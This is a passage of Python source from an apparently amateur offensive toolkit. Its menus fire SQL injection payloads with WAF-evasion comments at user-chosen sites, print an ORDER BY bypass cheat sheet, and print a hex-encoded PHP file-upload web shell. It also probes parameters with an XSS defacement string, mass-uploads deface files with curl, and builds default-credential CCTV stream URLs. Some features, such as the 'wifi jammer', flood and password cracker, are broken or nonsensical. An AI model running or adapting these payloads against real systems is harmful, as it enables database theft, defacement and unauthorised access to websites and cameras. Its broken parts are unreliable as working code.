            dork = [f'https://www.google.com/search?q={tugas}&client=ms-android-xiaomi-rev1&sca_esv=567941359&ei=9cQPZePzL6TV4-EPhJSs0AI&oq=doni+membeli+beberapa+ekor+sapi&gs_lp=EhNtb2JpbGUtZ3dzLXdpei1zZXJwIh9kb25pIG1lbWJlbGkgYmViZXJhcGEgZWtvciBzYXBpKgIIADIKEAAYRxjWBBiwAzIKEAAYRxjWBBiwAzIKEAAYRxjWBBiwAzIKEAAYRxjWBBiwAzIKEAAYRxjWBBiwAzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQzIKEAAYigUYsAMYQ0j5GVAAWABwAXgBkAEAmAEAoAEAqgEAuAEByAEA4gMEGAAgQYgGAZAGEQ&sclient=mobile-gws-wiz-serp']
            for kunci in dork:
                try:
                    print(info + f'Finding The Answer For Your Homework..')
                    for results in search(dork, tld='com', num=1, start=0, stop=None, pause=5):
                        print(success + f'Results :')
                        print(results)
                    else:
                        print(fail + f'Cant Find Answer')    
                except KeyboardInterrupt:
                    print("Interrupt Detected, Exit")
                    exit()
            print("Your Homework Answer Is Done..")    
        except KeyboardInterrupt:
            print("KeyboardInterrupt Detected, Exit.")
            exit()       
elif answer == ("12"):
    pass
    print("""\033[1;33m
    
    ▓█████ ▒██   ██▒▓█████  ▄████▄   █    ██ ▄▄▄█████▓ ▒█████   ██▀███  
    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
    ▒███   ░░  █   ░▒███   ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
    ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
    ░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
    ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
     ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒   ░░▒░ ░ ░     ░      ░ ▒ ▒░   ░▒ ░ ▒░
       ░    ░    ░     ░   ░         ░░░ ░ ░   ░      ░ ░ ░ ▒    ░░   ░ 
       ░  ░ ░    ░     ░  ░░ ░         ░                  ░ ░     ░     
                       ░                                            
     """)
    print(f'\033[1;34m')
    print("\033[1;34m1. Execute With Parameter")
    print("2. Check web with view-source")
    print("3. Check Site If Has index.php or index.html")
    print("4. Auto Execute ")
    print("5. All Dios By SanZz")
    print("6. Parameter Check")
    print(f'\033[1;33m')
    ans = input('Select : ')
    
    if ans.startswith("1"):
        pass
        url = input(f'\nsite target : ')
        postdata = input(f'\nParameter / Postdata [Example : ?id=] : ')
        postar = input(f'\nId Value [Example : orderby+1] : ')
        # Data yang ingin Anda kirim
        data = {f'{postdata}': f'{postar}'}

        # Mengirim permintaan POST dengan data
        response = requests.post(url, data=data)

        # Memeriksa respons dari server
        if response.status_code == 200:
            print("Success Post Request ! ")
            print("Response From Site:")
            print(response.text)
            print('\n')
            print(success + f'Url Results : {url}{postdata}{postar}')
        else:
            print('\n')
            print(fail + f"Fail Sending Post, E Code :", response.status_code)
            print(success + f'Url Results : {url}{postdata}{postar}')
    elif ans.startswith("2"):
        pass
        url = input(f'\nsite target : ')
        response = requests.post(url)

        # Memeriksa respons dari server
        if response.status_code == 200:
            print("Success Post Request ! ")
            print("Response From Site:")
            print(response.text)
        else:
            print("Gagal mengirim permintaan POST. Kode status:", response.status_code)
            print(response.text)
    elif ans.startswith("3"):
        pass
        vict = input (f'\nSite : ')
        check = ['/index.php', '/index.html', '/index.htm', '/index.shtml', '/index.js']
        
        for index in check:
            wet = vict + index
            response = requests.get(wet)
            
            if response.status_code == 200:
                print("Found ! ")
                print(wet)
            else:
                print("No index valid.")
        print("Done.. ")        
    elif ans.startswith("4"):
        pass
        url = input(f'\nsite target : ')
        postdata = input(f'\nParameter / Postdata [Example : ?id=] : ')
        postar = ('+ORDER+BY+0+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x+AND+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)version()user()database()now()@@hostname@@port@@tmpdir@@datadir@@basedir@@log@@log_bin@@log_error@@binlog_format@@time_format@@date_format@@servernamecurrent_user()UUID()schema()system_user()session_user()/*!50000ORDER*/')
        # Data yang ingin Anda kirim
        data = {f'{postdata}': f'{postar}'}

        # Mengirim permintaan POST dengan data
        response = requests.post(url, data=data)

        # Memeriksa respons dari server
        if response.status_code == 200:
            print("Success Post Request ! ")
            print("Response From Site:")
            print(response.text)
            print('\n')
            print(success + f'Url Results : {url}{postdata}{postar}')
        else:
            print('\n')
            print(fail + f"Fail Sending Post, E Code :", response.status_code)
            print(success + f'Url Results : {url}{postdata}{postar}')            
    elif ans.startswith("5"):
        pass
        print('\n')
        print("\033[1;34m_" *22)
        print(info + f"""
        1. DIOS V1 By SanZz
        2. DIOS V2 By SanZz
        3. DIOS V3 By SanZz
        4. Get Databases With Bypass
        5. Hard Dios
        6. More
        """)
        print("\033[1;34m_" *22)
        print('')
        slct = input(info + f'\nSelect : ')
        print('\n')
        print("""\033[1;91m
                                                                                                                                                                                                                                                                                                                                                                         ░░░░░░░░    ░░░        ░░░▒▒▒░                              
                                  ░██████████████████████████████░                             
                                  ░▓▓▓▓▓▓▓▓░▒▓█▓▓▓░░░▓█▒▒▓▓█████▓░                       ░░░░▒░
                                      ░░▒▓▓▓▓███▓▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████▓
            ░░░░░░░░░░░░▒▒▒▒▒▓▓▓▓▓░░▒██████████████████████████████████████████████████▓▓▓▓▒▒▒░
            ██████████████████████████████████████████▓▓▓▓▓▓▒▒▒░░░░░░░░░░░░░░░░                
            ████████████████████████▓░░░▓▒░▒▒░ ░░                                              
           ▒████████████████▒▒████░░   ░░░░░                                                  
           ░██████████▒░░░   ░░▓█▓                                                            
           ░███▓▓▒░░                                                       
                                              \033[1;33mSQLI NET HUNTER       
                                             \033[1;34m[ + ] Sniper [ + ]        
           """)
        print('\033[1;33m')
        if slct.startswith("1"):
            pass
            target = input(f'\nTarget Sites : ')
            parameter = input(f'\nParameter / Post Data : ')
            post = ("information_schem\a.columns+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)/*!50000BY*/+and+null+and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x limit 0,1)))(select+top+1+%2b' '%2bcolumn_name as t+from+table_name FOR/**Hacked By EternightyIHT**/ XML PATH(''))")
            res = target + parameter + post
            response = requests.get(res)
            if response.status_code == 200:
                print(success + f'Injection Successfully')
                print(success + f"Results : ", res)
            else:
                print(fail + f'Fail Injection, Status Code : ', response)  
                print(success + f"Results : ", res) 
        elif slct.startswith("2"):
            pass
            target = input(f'\nTarget Sites : ')
            parameter = input(f'\nParameter / Post Data : ')
            post = ("+AND+0+UNION+SELECT++ORDER+BY+0and@dh:=()+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x+AND+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)version()user()database()now()@@tmpdir@@datadir@@basedir@@log@@servernamecurrent_database()schema()session_user()")
            res = target + parameter + post
            response = requests.get(res)
            if response.status_code == 200:
                print(success + f'Injection Successfully')
                print(success + f"Results : ", res)
            else:
                print(fail + f"Fail Injection, Status Code : ", response)   
                print(success + f"Results : ", res)
        elif slct.startswith("3"):
            pass
            target = input(f'\nTarget Sites : ')
            parameter = input(f'\nParameter / Post Data : ')
            post = ("+AND+0+UNION+SELECT+1,2,3,4,5,6,7,8,9,10+and extractvalue(0x0a,concat(0x0a,(select version())))+and extractvalue(0x0a,concat(0x0a,(select database())))+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))+and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x7461626c655f6e616d65 limit 0,1)))/*!50000CoNcAt/**_**/*/()+And+0+and@:=(SELECT+GROUP_CONCAT(0x3c62723e,/*!50000table_name*/,0x3a3a3a3a3a20,/*!50000column_name*/)+/*!50000FROM*/+/*!50000INFORMATION_SCHEMA*/.COLUMNS+WHERE+TABLE_SCHEMA=DATABASE/**_**/())+/*!50000UNION*/+SELECT/**HackedBy EternightyIHT**/'--+-version()database()user()now()@@datadir@@basedir@@log@@tmpdir@@log_binschema()current_user()")
            res = target + parameter + post
            response = requests.get(res)
            if response.status_code == 200:
                print(success + f'Injection Successfully')
                print(success + f"Results : ", res)
            else:
                print(fail + f"Fail Injection, Status Code : ", response)   
                print(success + f"Results : ", res)    
        elif slct.startswith("4"):
            pass
            target = input(f'\nTarget Sites : ')
            parameter = input(f'\nParameter / Post Data : ')
            post = ("/*!50000UNION*/+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x+AND+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)/*!50000GROUP/**_**/*/+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(+AS+CHAR),0x7e))+FROM++LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)version()user()database()now()@@tmpdir@@datadir@@basedir@@log+ORDER+BY+0")
            res = target + parameter + post
            response = requests.get(res)
            if response.status_code == 200:
                print(success + f"Injection Successfully")
                print(success + f"Results : ", res)
            else:
                print(fail + f"Fail Injection, Status Code : ", response)   
                print(success + f"Results : ", res)
        elif slct.startswith("5"):
            pass
            target = input(f'\nTarget Sites : ')
            parameter = input(f'\nParameter / Post Data : ')
            post = ("+ORDER+BY+0+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x+AND+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(+AS+CHAR),0x7e))+FROM++LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)+and extractvalue(0x0a,concat(0x0a,(select database())))+and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))+and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=database() and table_name=0x limit 0,1)))+and extractvalue(0x0a,concat(0x0a,(select concat() from  limit 0,1)))%0AuNION%0ASeLECT%0A%0B")
            res = target + parameter + post
            response = requests.get(res)
            if response.status_code == 200:
                print(success + f"Injection Successfully")
                print(success + f"Results : ", res)
            else:
                print(fail + f"Fail Injection, Status Code : ", response)  
                print(success + f"Results : ", res)   
        elif slct.startswith("6"):
            pass
            print('\n')
            print("\033[1;34m_" *22)
            print(info + f"""
            1. Union List
            2. Order By
            3. Uploader
            4. E Based
            """)
            print("\033[1;34m_" *22)
            print('')
            i = input(info + f'\nSelect : ')
            print('\n')
            print("""\033[1;91m                                                                                                                                                                                                                                                                                                                                                                      ░░░░░░░░    ░░░        ░░░▒▒▒░                              
                                      ░██████████████████████████████░                             
                                      ░▓▓▓▓▓▓▓▓░▒▓█▓▓▓░░░▓█▒▒▓▓█████▓░                       ░░░░▒░
                                          ░░▒▓▓▓▓███▓▓▓▓▓████▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓█████▓
                ░░░░░░░░░░░░▒▒▒▒▒▓▓▓▓▓░░▒██████████████████████████████████████████████████▓▓▓▓▒▒▒░
                ██████████████████████████████████████████▓▓▓▓▓▓▒▒▒░░░░░░░░░░░░░░░░                
                ████████████████████████▓░░░▓▒░▒▒░ ░░                                              
               ▒████████████████▒▒████░░   ░░░░░                                                  
               ░██████████▒░░░   ░░▓█▓                                                            
               ░███▓▓▒░░                                                       
                                                  \033[1;33mSQLI NET HUNTER       
                                                 \033[1;34m[ + ] Sniper [ + ]
               """)                            
            if i.startswith("1"):
                pass
                print("""
                1. Union Select 1 - Next Page
                2. Database
                3. Union Select(3) [Fixed]
                4. Join Method [Coming Soon]
                5. Select Bof [Coming Soon]
                """)
                y = input("Select : ")
                
                if y.startswith("1"):
                    pass
                    value = int(input(f'\nValue : '))
                    
                    result = ', '.join(str(i) for i in range(1, value + 1))
                    onion = ('+AND+0+UNION+SELECT+')
                    print('')
                    print(onion,result)
                elif y.startswith("2"):
                    pass
                    print("Database Dump : ")
                    print('(SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)')
                elif y.startswith("3"):
                    pass
                    value = int(input(f'Value : '))
                    
                    t = '),('.join(str(t) for t in range(1, value + 1))
                    result = f'({t})'
                    onion = (f'+AND+0+UNION(SELECT{result})')  
                    print('')
                    print('Results : ')  
                    print(onion)
            elif i.startswith("2"):
                pass
                print('\n')
                print(f"""\033[1;34m
                1 . /*!50000ORDER*/
                2 . /*!50000ORDER/**_**/*/
                3 . /*!50000GROUP*/
                4 . /*!50000GROUP/**_**/*/
                5 . /*!50000BY*/
                6 . /*!50000BY/**_**/*/
                7 . /**/ORDER/**/BY/**/100
                8 . %23%0AORDER%23%0ABY%23%0A100
                9 . %0AORDER%0ABY%0A100
                10 . %2f**%2fORDER%2f**%2fBY%2f**%2f100
                11 . +/*!order/**/by*/1
                12 . +ORDER+BY+100+ASC
                13 . +/*!50000ORDER*/+/*!50000BY*/+100
                14 . +/*!50000GROUP*/+/*!50000BY*/+100
                15 . +AND+MOD(52,12)+/*!50000ORDER*/+BY+100
                16 . +AND+MOD(52,12)+/*!50000GROUP*/+BY+100
                17 . +AND+MOD(29,9)+/*!50000ORDER/**_**/*/+/*!50000BY/**_**/*/+100
                18 . +/*!12345ORDER*/+/*!12345BY*/100
                19 . +ORDER BY/**_**/100
                """)        
            elif i.startswith("3"):
                pass
                print('\n')
                print('\033[1;34m0x3c3f706870206563686f202755706c6f616465723c62723e273b6563686f20273c62723e273b6563686f20273c666f726d20616374696f6e3d2222206d6574686f643d22706f73742220656e63747970653d226d756c7469706172742f666f726d2d6461746122206e616d653d2275706c6f61646572222069643d2275706c6f61646572223e273b6563686f20273c696e70757420747970653d2266696c6522206e616d653d2266696c65222073697a653d223530223e3c696e707574206e616d653d225f75706c2220747970653d227375626d6974222069643d225f75706c222076616c75653d2255706c6f6164223e3c2f666f726d3e273b69662820245f504f53545b275f75706c275d203d3d202255706c6f6164222029207b69662840636f707928245f46494c45535b2766696c65275d5b27746d705f6e616d65275d2c20245f46494c45535b2766696c65275d5b276e616d65275d2929207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d656c7365207b206563686f20273c623e55706c6f6164202121213c2f623e3c62723e3c62723e273b207d7d3f3e')
            elif i.startswith("4"):
                pass
                print('\n')
                print("\033[1;34m_" *22)
                print(info + f"""
                1. DB V
                2. DB Name
                3. Tables
                4. Columns
                5. Dump Data
                """)
                print("\033[1;34m_" *22)
                print('')
                slt = input(info + f'\nSelect : ')
                
                if slt.startswith("1"):
                    pass
                    print('\n')
                    print('\033[1;34m+OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1')
                elif slt.startswith("2"):
                    pass
                    print('\n')
                    print('\033[1;34m+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)')
                elif slt.startswith("3"):
                    pass
                    print('\n')
                    print('\033[1;34m+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)')
                elif slt.startswith("4"):
                    pass
                    print('\n')
                    print('\033[1;34m+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x+AND+table_schema=0x+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)')
                elif slt.startswith("5"):
                    pass
                    print('\n')
                    print('\033[1;34m+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(+AS+CHAR),0x7e))+FROM++LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)')    
    if ans.startswith("6"):
        try:
            print("Write Target : https://www.example.com/index.php so the tools just check the parameter")
            site = input(f"Target Site : ")
            time.sleep(0.5)
            d = ['?find=','?Find=' ,'?Cari=', '?cari=', '?id=', '?message=', '?page=', '?session=', '?about=', '?add=', '?page_cart=', '?cart=', '?list=', '?index=', '?add_new=', '?addTag=', '?addSite=', '?adm=', '?pass=', '?show_msg=', '?show=', '?api=', '?auth_user=', '?approved=', '?redirect=', '?html=', '?text=']
            for y in d:
                rand_user = random.choice(user_agents)
                rand_ip = random.choice(randomipv4)
                rand_ip6 = random.choice(randomipv6)
                o = site + y
                response = requests.get(o)
                if response == True or response.status_code == 200:
                    pass
                    print(success + f"Ok Result")
                    print(f"{site}{y}")
                    print(info + f"Injecting With XSS...")
                    keyword = "Hacked By Someone"
                    xss = '"></a></span></p></input></form><h1>Hacked+By+Someone</h1>'
                    xsr = str(f'{o}{xss}')
                    blue = '\033[1;34m'
                    print(success + xsr)
                    print(info + f"Checking...")
                    response = requests.get(xsr)
                    if response.status_code == 200:
                        if re.search(keyword, response.text, re.IGNORECASE):
                            print(success + f"\033[1;34mThe Site Has A Vuln.")
                            print(blue + xsr)
                        else:
                            print(fail + f"Site Has No Vuln Or Parameter")
                    else:
                        print('')
        except requests.exceptions.SSLError:
            pass
            print(fail + f"SSL Error")
        
elif answer == ("13"):
    pass
    sites = input(f'\nSite : ')
    os.system(f'ping {sites}')
elif answer == ("14"):
    try:
        print("""\033[1;33m
        
        ██████╗ ███████╗███████╗ █████╗  ██████╗███████╗██████╗ 
        ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
        ██║  ██║█████╗  █████╗  ███████║██║     █████╗  ██████╔╝
        ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
        ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗██║  ██║
        ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
                                                        
        """)
        upload_url = input(f'\033[1;34m\nSite Target : ')
        files2 = input(f'\nFile [example : hai.html] : ')
        file_path = f'/storage/emulated/0/{files2}'

        with open(file_path, 'rb') as file:
            file_data = file.read()

        # Membuat dictionary dengan file yang akan diunggah
        files = {'file': (f'{files2}', file_data, 'application/octet-stream')}

        # Melakukan permintaan POST ke URL unggahan dengan file yang diunggah
        response = os.system(f'curl -T {file_path} {upload_url}')

        # Mengecek apakah file berhasil diunggah
        if response == True:
            print(fail + f"File Failed Uploaded.")
        else:
            print(success + f"Results: ")
            print(f'{upload_url}/{files2}')
    except FileNotFoundError:
        print(fail + f'File {files2} Not Found On Your Internal')
elif answer == ("15"):
    pass
    print("The AI Didn't Work, So This Feature Has Been Deleted By The Owner..")
elif answer == ("16"):
    try:
        print("""\033[1;33m
        
        ██████╗ ███████╗███████╗ █████╗  ██████╗███████╗██████╗ 
        ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝██╔══██╗
        ██║  ██║█████╗  █████╗  ███████║██║     █████╗  ██████╔╝
        ██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  ██╔══██╗
        ██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗██║  ██║
        ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝
                                                       
                                 MASS DEFACE                       
        """)
        pass
        files2 = input(f'\nFile [example : hai.html] : ')
        file_path = f'/storage/emulated/0/{files2}'
        def flogger(files2, file_path):
            print('')
        while True:
            pass     
            upload_url = input(f'\033[1;34m\nSite Target : ')
        
            with open(file_path, 'rb') as file:
                file_data = file.read()

            # Membuat dictionary dengan file yang akan diunggah
            files = {'file': (f'{files2}', file_data, 'application/octet-stream')}
        
            response = os.system(f'curl -T {file_path} {upload_url}')
            
            # Mengecek apakah file berhasil diunggah
            if response == True:
                print(fail + f"File Failed Uploaded.")
            else:
                print(success + f"Results: ")
                print(f'{upload_url}/{files2}')     
    except FileNotFoundError:
        print(fail + f'File {files2} Not Found On Your Internal')
elif answer == ("17"):
    print("\033[1;33mBooting UP Wifi Jammer..")
    os.system('pip3 install google')
    os.system('apt install iproute2')
    if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
        os.system('clear')
    elif os.name == 'nt':   # Untuk sistem Windows
        os.system('cls')
    success = '\033[1;32m'
    fail = '\033[1;91m'
    info = '\033[1;33m'

    time.sleep(0.5)
    print("""\033[1;91m

    ██╗    ██╗██╗███████╗██╗         ██╗ █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
    ██║    ██║██║██╔════╝██║         ██║██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
    ██║ █╗ ██║██║█████╗  ██║         ██║███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
    ██║███╗██║██║██╔══╝  ██║    ██   ██║██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
    ╚███╔███╔╝██║██║     ██║    ╚█████╔╝██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
     ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝     ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                       \033[1;33mV 1.9\033[1;91m            
                               \033[1;34mHey ! It's Me MrSanZz !\033         
    """)
    print(info + f"Note : This tools made by MrSanZz, This tools is for jammering wifi like, Make the wifi connection slow.")
    h = input("Start The Tools? Y/N : ")

    if h == "Y" or "y":
        pass
        print('')
        print(f'\033[1;33m_' *22)
        print("\033[1;91mAvailable Networks : ")
        print('\033[1;32m')
        if os.name == 'posix':  # Untuk sistem seperti Linux atau macOS
            os.system('ip -iec neighbour')
        elif os.name == 'nt':   # Untuk sistem Windows
            os.system('net user')
        print(f'\033[1;33m_' *22)
    
        print("1. Jammer Mode")
        print("2. IP Object")
        print("3. Crack All Wifi Password [Windows Terminal ONLY !]")
        print("4. INFRA RED SENDER, +25 Frequency 5/sec")
        print("5. A Little Annoying")
        print("6. IDK")
        e = input("Select : ")
    
        if e == "1":
            print("\033[1;34mSelect Method : ")
            print("1. RAP")
            print("2. RPC")
            print("3. ADS")
            print('')
            m = input(" : ")
        
            if m == ("1"):
                pass
                print("""\033[1;33m
                1. Database Info (Coming Soon)
                2. Leak Report (single)
                3. Leak Report (all)
                4. \033[1;91m<!>\033[1;34m Disrupting the Connection \033[1;91m<!>\033[1;33m
                5. CCTV Finder
                """)
                s = input("Select : ")
            
                if s ==("1"):
                    pass
                    print("""\033[1;33m
                    [ + ] Coming Soon ! [ + ]
                    """)
                elif s == ("2"):
                    pass
                    target = input("Input target ip : ")
                    time.sleep(0.5)
                    os.system(f'net rap user info --leak-report {target}')
                elif s == ("3"):
                    pass
                    target = input("Input target ip : ")
                    time.sleep(0.5)
                    os.system(f'net rap user info --leak-report-full {target}')
                elif s == ("4"):
                        trgt = input(f'IP Target : ')
                        port = input("Port : ")
                    
                        def flood(trgt, port):
                            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            b = 5000000
                            sent = 5000
                            s.sendto(b, (trgt, port))
                            
                        while True:
                            pass
                            sent = 5000
                            sent = sent + 1
                            time.sleep(0.5)
                            print(success + f"Jammering {trgt} On Port {port}", s)
                elif s == ("5"):
                    try:
                        targets = input(f'IP Target : ')
                        port = input(f'Port : ')
                        time.sleep(0.5)
                        print("Please Wait..")
                        time.sleep(0.5)
                    
                        dork = ['inurl:', 'intitle:']
                        dork2 = ['cctv', 'view.shtml']
                        for e in dork:
                            file_exists = ('.google-cookie')
                            if file_exists == True:
                                os.remove(file_exists)
                            print(f"Finding {targets} CCTV..")
                            for s in dork2:
                                pass
                                for results in search(f'{e}{s} {targets}:{port}', tld='com', num=1, start=0, stop=None):
                                    response = requests.get(results)
                                    if response.status_code == 200:
                                        print(success + f'Found : ')
                                        print(results)
                                    else:
                                        print(fail + f'Cant Find {targets} CCTV')
                                yes = input(fail + f'Do you wanna retry? Y/N : ')
                            
                                if yes.startswith('Y' or 'y'):
                                    pass
                                    targets = input(f'IP Target : ')
                                    port = input(f'Port : ')
                                    time.sleep(0.5)
                                    print("Please Wait..")
                                    time.sleep(0.5)
                                
                                    dozher = f'rtsp://admin:123456a@{targets}:{port}/streaming/channels/102'
                                    print(info + f'{dozher}')        
                    except KeyboardInterrupt:
                        exit()               
            elif m == ("2"):
                pass
                print("""\033[1;33m
                1. Database Info (Coming Soon)
                2. Leak Report (single)
                3. Leak Report (all)
                4. \033[1;91m<!>\033[1;34m Disrupting the Connection \033[1;91m<!>\033[1;33m
                5. CCTV Finder
                """)
                s = input("Select : ")
            
                if s ==("1"):
                    pass
                    print("""\033[1;33m
                    [ + ] Coming Soon ! [ + ]
                    """)
                elif s == ("2"):
                    pass
                    target = input("Input target ip : ")
                    time.sleep(0.5)
